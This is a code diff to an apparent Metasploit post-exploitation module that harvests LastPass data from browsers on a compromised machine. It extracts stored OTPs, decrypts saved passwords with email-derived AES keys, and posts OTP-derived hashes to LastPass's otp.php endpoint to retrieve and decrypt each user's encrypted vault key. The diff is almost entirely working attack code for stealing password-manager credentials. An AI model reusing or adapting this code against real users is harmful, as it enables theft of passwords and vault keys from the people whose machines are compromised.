@@ -29,6 +29,7 @@ class Metasploit3 < Msf::Post
   end
 
   def run
+
     if session.platform =~ /win/ && session.type == "shell" # No Windows shell support
       print_error "Shell sessions on Windows are not supported"
       return
@@ -49,7 +50,7 @@ class Metasploit3 < Msf::Post
     extract_2fa_tokens(account_map)
 
     print_status "Extracting encryption keys"
-    extract_keys(account_map)
+    extract_vault_keys(account_map)
 
     print_status "Extracting vault and iterations"                           
     extract_vault_and_iterations(account_map)
@@ -253,35 +254,29 @@ class Metasploit3 < Msf::Post
     credentials
   end
 
-  # Decrypts the password
-  def clear_text_password(email, encrypted_data)
+
+  def decrypt_data(key, encrypted_data)
     return if encrypted_data.blank?
 
-    decrypted_password = "DECRYPTION_ERROR"
-
-    sha256_hex_email = OpenSSL::Digest::SHA256.hexdigest(email)
-    sha256_binary_email = [sha256_hex_email].pack "H*" # Do hex2bin
+    decrypted_data = "DECRYPTION_ERROR"
 
     if encrypted_data.include?("|") # Use CBC
       decipher = OpenSSL::Cipher.new("AES-256-CBC")
-      decipher.decrypt
-      decipher.key = sha256_binary_email # The key is the emails hashed to SHA256 and converted to binary
       decipher.iv = Base64.decode64(encrypted_data[1, 24]) # Discard ! and |
-      encrypted_password = encrypted_data[26..-1]
+      encrypted_data = encrypted_data[26..-1] #Take only the data part
     else # Use ECB
       decipher = OpenSSL::Cipher.new("AES-256-ECB")
-      decipher.decrypt
-      decipher.key = sha256_binary_email
-      encrypted_password = encrypted_data
     end
 
     begin
-      decrypted_password = decipher.update(Base64.decode64(encrypted_password)) + decipher.final
+      decipher.decrypt
+      decipher.key = key
+      decrypted_data = decipher.update(Base64.decode64(encrypted_data)) + decipher.final
     rescue
-      vprint_error "Password for #{email} could not be decrypted"
+      vprint_error "Data could not be decrypted"
     end
 
-    decrypted_password
+    decrypted_data
   end
 
   def extract_credentials(account_map)
@@ -304,11 +299,15 @@ class Metasploit3 < Msf::Post
             ffcreds = firefox_credentials(loot_path)
             unless ffcreds.blank?
               ffcreds.each do |creds|
-                creds[1].blank? ? creds[1] = "NOT_FOUND" : creds[1] = clear_text_password(URI.unescape(creds[0]), URI.unescape(creds[1])) #Decrypt credentials
-                credentials[account][browser][URI.unescape(creds[0])] = [URI.unescape(creds[1])]
+                if creds[1].blank?
+                  creds[1] = "NOT_FOUND"
+                else
+                  sha256_hex_email = OpenSSL::Digest::SHA256.hexdigest(URI.unescape(creds[0]))
+                  sha256_binary_email = [sha256_hex_email].pack "H*" # Do hex2bin
+                  creds[1] = decrypt_data(sha256_binary_email, URI.unescape(creds[1]))
+                  account_map[account][browser]['lp_creds'][creds[0]] = {'lp_password' => creds[1]}
+                end
               end
-            else
-              credentials[account].delete("Firefox")
             end
 
           end
@@ -334,8 +333,14 @@ class Metasploit3 < Msf::Post
 
             for row in result
               if row[0]
-                row[1].blank? ? row[1] = "NOT_FOUND" : row[1] = clear_text_password(row[0], row[1]) #Decrypt credentials
-                account_map[account][browser]['lp_creds'][row[0]] = {'lp_password' => row[1]}
+                if row[1].blank?
+                  row[1] = "NOT_FOUND"
+                else
+                  sha256_hex_email = OpenSSL::Digest::SHA256.hexdigest(row[0])
+                  sha256_binary_email = [sha256_hex_email].pack "H*" # Do hex2bin
+                  row[1] = decrypt_data(sha256_binary_email, row[1])
+                  account_map[account][browser]['lp_creds'][row[0]] = {'lp_password' => row[1]}
+                end
               end
             end
           end
@@ -473,118 +478,103 @@ class Metasploit3 < Msf::Post
   end
 
 
-
-
-  def extract_keys(account_map)
+  def extract_vault_keys(account_map)
     account_map.each_pair do |account, browser_map|
       browser_map.each_pair do |browser, lp_data|
         lp_data['lp_creds'].each_pair do |username, user_data|
-          otp, encrypted_key = extract_otp_and_encrypted_key(account, browser, username, lp_data['lp_db_loot'])
-          #otp_token = OpenSSL::Digest::SHA256.hexdigest( OpenSSL::Digest::SHA256.hexdigest( username + otp ) + otp )
-          otp = "7b88275911a8efc3efe50a3bda6ac202"
-          otpbin = [otp].pack "H*"
-          otp_token = lastpass_sha256( lastpass_sha256( username + otpbin ) + otpbin )
-          lp_data['lp_creds'][username]['vault_key'] = decrypt_vault_key(username, otp_token, encrypted_key)
-
-
+          otp = extract_otp(account, browser, username, lp_data['lp_db_loot'])
+          lp_data['lp_creds'][username]['vault_key'] = decrypt_vault_key_with_otp(username, otp)
         end
       end
     end
   end
 
-
   # Returns otp, encrypted_key
-  def extract_otp_and_encrypted_key(account, browser, username, path)    
+  def extract_otp(account, browser, username, path)    
     if browser == 'Firefox'
       path = firefox_map[account][browser] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_ff.sotp"
       otp = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
       otp = "NOT FOUND" if otp.blank? # Verify content
-
-      path = firefox_map[account][browser] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lpall.slps"
-      encrypted_key = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
-      encrypted_key = "NOT FOUND" if encrypted_key.blank? # Verify content
-      data = encrypted_key.split("\r")[0]
-      return [otp, encrypted_key] 
+      return otp 
     else # Chrome, Safari and Opera
       db = SQLite3::Database.new(path)
       result = db.execute(
         "SELECT type, data FROM LastPassData " \
-        "WHERE username_hash = '"+OpenSSL::Digest::SHA256.hexdigest(username)+"' AND type IN ('otp', 'key')"
+        "WHERE username_hash = '"+OpenSSL::Digest::SHA256.hexdigest(username)+"' AND type = 'otp'"
       )
-
-      if result.size == 2
-        if result[0][0] == "otp"
-          return result[0][1], result[1][1] 
-        else 
-          return result[1][1], result[0][1] 
-        end
-      end
-
-      return "", ""
+      return result[0][1]
     end
   end
 
 
-  def decrypt_vault_key(username, token, encrypted_key)
-    return "adecryptionkey"
-
+  def make_vault_key_from_creds username, password, key_iteration_count
+    if key_iteration_count == 1
+        key = Digest::SHA256.hexdigest username + password
+    else
+        key = pbkdf2(password, username, key_iteration_count, 32)
+    end
+    
+    return key
   end
 
+  def decrypt_vault_key_with_otp username, otp
+    otpbin = [otp].pack "H*"
+    vault_key_decryption_key = [lastpass_sha256(username + otpbin)].pack "H*"
+    encrypted_vault_key = retrieve_encrypted_vault_key_with_otp(username, otp)
+    return decrypt_data(vault_key_decryption_key, encrypted_vault_key)
+  end
+
+  def retrieve_encrypted_vault_key_with_otp username, otp
+    # Derive login hash from otp
+    otpbin = [otp].pack "H*"
+    otp_token = lastpass_sha256( lastpass_sha256( username + otpbin ) + otpbin ) # OTP login hash
+
+    # Make request to LastPass
+    uri = URI('https://lastpass.com/otp.php')
+    request = Net::HTTP::Post.new(uri)
+    request.set_form_data("login" => 1, "xml" => 1, "hash" => otp_token, "otpemail" => URI.escape(username), "outofbandsupported" => 1, "changepw" => otp_token)
+    request.content_type = 'application/x-www-form-urlencoded; charset=UTF-8'
+    response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true) {|http|
+      http.request(request)
+    }
+
+    # Parse response
+    encrypted_vault_key = nil
+    if response.body.match(/randkey\="(.*)"/)
+      encrypted_vault_key = response.body.match(/randkey\="(.*)"/)[1]
+    end
+
+    return encrypted_vault_key
+  end
 
   # LastPass does some preprocessing (UTF8) when doing a SHA256 on special chars (binary)
   def lastpass_sha256(input)
     output = ""
 
-    input.split("").each do |char|
-      digit = char.ord
-      if (digit <= 128)
-        output += digit.chr
+    input = input.gsub("\r\n", "\n")
+
+    input.each_byte do |e|
+      if 128 > e
+        output += e.chr
       else
-        output += (digit >> 6 | 192).chr
-        output += (digit >> 6 & 63 | 128).chr
-        output += (digit & 63 | 128).chr
+        if (127 < e && 2048 > e)
+          output += (e >> 6 | 192).chr
+          output += (e & 63 | 128).chr
+        else
+          output += (e >> 12 | 224).chr
+          output += (e >> 6 & 63 | 128).chr
+        end
       end
     end
-
-    #Nasty hack to switch Windows /r/n for /n
-    output = output.delete 130.chr+131.chr
-    output << 130.chr
 
     return OpenSSL::Digest::SHA256.hexdigest(output)
   end
 
 
-  def lastpass_sha256_test(input)
-    input = "7b88275911a8efc3efe50a3bda6ac202"
-    input = [input].pack "H*"
-    output = ""
-    #inputbin = [input].pack "H*"
-    puts input
-    input.split("").each do |char|
-      digit = char.ord
-      if (digit <= 128)
-        output += digit.chr
-      else
-        output += (digit >> 6 | 192).chr
-        output += (digit >> 6 & 63 | 128).chr
-        output += (digit & 63 | 128).chr
-      end
-      
-    end
-
-    input.split("").each do |char|
-      puts char.ord
-    end
-    puts OpenSSL::Digest::SHA256.hexdigest(output)
-    #return
-
-    #Nasty hack to switch Windows /r/n for /n
-    #output = output.delete 130.chr+131.chr
-    #output << 130.chr
-
-    return OpenSSL::Digest::SHA256.hexdigest(output)
-  end
-
+  def pbkdf2(password, salt, iterations, key_length)
+    digest = OpenSSL::Digest::SHA256.new
+    return OpenSSL::PKCS5.pbkdf2_hmac(password, salt, iterations, key_length, digest).unpack 'H*'
+  end 
 
 
 end
